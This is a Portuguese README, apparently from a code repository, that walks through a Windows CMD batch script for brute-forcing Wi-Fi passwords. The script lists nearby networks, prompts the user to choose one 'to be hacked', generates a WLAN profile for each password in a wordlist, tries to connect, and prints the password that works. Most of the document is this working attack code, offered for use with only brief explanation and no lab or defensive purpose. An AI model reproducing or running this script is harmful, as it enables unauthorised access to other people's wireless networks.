# BruteForce de Wi-fi com CMD ( Prompt de comando do Windows )

---

### Lembrando
**Antes de iniciar o programa, é preciso criar um wordlist.txt no mesmo diretório do programa**

---

Estarei mostrando uma forma de usar o método de Brute Force para Wi-Fi no Windows;
**Resaltando que este Brute Force foi feito no WIndows 10** *(Caso você for testar em uma outra versão, talvez não funcione por conta das "Frases de retorno que contém no código" mas pode ser editado de acordo com o que é retornado :D)* 

### Começando
O comando `netsh wlan show networks bssid` verifica todas as redes wi-fi disponíveis 
 ao alcance de seu adaptador de rede wireless

As únicas informações necessárias para mim seria o SSID e o tipo de Autenticação, para isso usei um filtro com o comando **Find** e **Findstr** abaixo:

```
netsh wlan show networks bssid | findstr "SSID Autentica" | findstr /v "BSSID">o
type o | find "SSID" | find /n ":">u
type o | find "Autentica" | find /n ":">i
type u
```
Na sequência usei o Comando **for** foi usado para separar o que eu queria
```
set /p bf="Na lista acima, escolha um numero do Wifi para ser hackeada: "

for /f "tokens=1,2* delims=:" %%a in ('find "[%bf%]" u') do (
	for /f "tokens=1* delims= " %%e in ("%%b") do (
		if "%%f" EQU "" (
			set select=%%e
		)else (
			set select=%%e %%f
		)
	)
)

for /f "tokens=1,2 delims=:" %%a in ('find "[%bf%]" i') do (
	
	for /f "tokens=1,2 delims= " %%e in ("%%b") do (
		for /f "tokens=1,2 delims=-" %%m in ("%%e") do (
			set tipo=%%m
		)
	)
)
```
No código abaixo eu peço para que converta o nome da rede wi-fi que no *For* foi separado e converta em hexadecimal, ( *Eu não encontrei uma forma de fazer isso no cmd, quem souber, adicione seu commit* ) porem eu utilizo o Python pra isso, ou algum site que faça a conversão essa parte é manual mesmo, por enquanto
```
cls
echo.
echo Copie o nome da rede "%select%" Sem as aspas e converta em Hexadecimal
echo.
echo.
set /p hexa="Cole o Hexadecimal aqui: "
cls
```
Agora vem a parte final onde eu adiciono um perfil de rede wireless para poder me conectar e testo a conexão; caso funcione ele conecta e finaliza;
```

for /f "tokens=*" %%a in (wordlist.txt) do (
	echo ^<?xml version="1.0"?^> >"Wi-Fi-%select%.xml"
	echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> >>"Wi-Fi-%select%.xml"
	echo 	^<name^>%select%^</name^> >>"Wi-Fi-%select%.xml"
	echo 	^<SSIDConfig^> >>"Wi-Fi-%select%.xml"
	echo 		^<SSID^> >>"Wi-Fi-%select%.xml"
	echo 			^<hex^>%hexa%^</hex^> >>"Wi-Fi-%select%.xml"
	echo 			^<name^>%Select%^</name^> >>"Wi-Fi-%select%.xml"
	echo 		^</SSID^> >>"Wi-Fi-%select%.xml"
	echo 	^</SSIDConfig^> >>"Wi-Fi-%select%.xml"
	echo 	^<connectionType^>ESS^</connectionType^> >>"Wi-Fi-%select%.xml"
	echo 	^<connectionMode^>auto^</connectionMode^> >>"Wi-Fi-%select%.xml"
	echo 	^<MSM^> >>"Wi-Fi-%select%.xml"
	echo 		^<security^> >>"Wi-Fi-%select%.xml"
	echo 			^<authEncryption^> >>"Wi-Fi-%select%.xml"
	echo 				^<authentication^>%tipo%PSK^</authentication^> >>"Wi-Fi-%select%.xml"
	echo 				^<encryption^>AES^</encryption^> >>"Wi-Fi-%select%.xml"
	echo 				^<useOneX^>false^</useOneX^> >>"Wi-Fi-%select%.xml"
	echo 			^</authEncryption^> >>"Wi-Fi-%select%.xml"
	echo 			^<sharedKey^> >>"Wi-Fi-%select%.xml"
	echo 				^<keyType^>passPhrase^</keyType^> >>"Wi-Fi-%select%.xml"
	echo 				^<protected^>false^</protected^> >>"Wi-Fi-%select%.xml"
	echo 				^<keyMaterial^>%%a^</keyMaterial^> >>"Wi-Fi-%select%.xml"
	echo 			^</sharedKey^> >>"Wi-Fi-%select%.xml"
	echo 		^</security^> >>"Wi-Fi-%select%.xml"
	echo 	^</MSM^> >>"Wi-Fi-%select%.xml"
	echo 	^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^> >>"Wi-Fi-%select%.xml"
	echo 		^<enableRandomization^>false^</enableRandomization^> >>"Wi-Fi-%select%.xml"
	echo 	^</MacRandomization^> >>"Wi-Fi-%select%.xml"
	echo ^</WLANProfile^> >>"Wi-Fi-%select%.xml"
	echo ===================================
	echo.
	echo Testando Senha: %%a
	echo Aguade...
	netsh wlan disconnect
	netsh wlan add profile filename="Wi-Fi-%select%.xml">nul
	ping /n 2 127.0.0.1>nul
	netsh wlan connect "%select%">nul
	ping /n 15 127.0.0.1>nul
	netsh wlan show interfaces | find "Estado">connectStatus
	for /f "tokens=1* delims=:" %%d in (connectStatus) do (
		for /f "tokens=1* delims= " %%m in ("%%e") do (
			if %%m EQU Desconectado (
				echo Acesso Negado
			)else (
				echo Acesso Permitido
				set password=%%a
				goto fim
			)
		)
	)
	echo.
	echo ===================================
	
)
```
Abaixo é só a finalização e exclusão dos arquivos;
```
:fim
echo.
echo.
echo Senha de acesso: %password%
del /f /q connectStatus
del /f /q a
del /f /q o
del /f /q u
del /f /q i
del /f /q "Wi-Fi-%select%.xml"
echo.
echo.
pause
```

Meu perfil Facebook: https://www.facebook.com/100001371062730

Autor: Dayvson Vinicius

Data Crição: 18/02/2018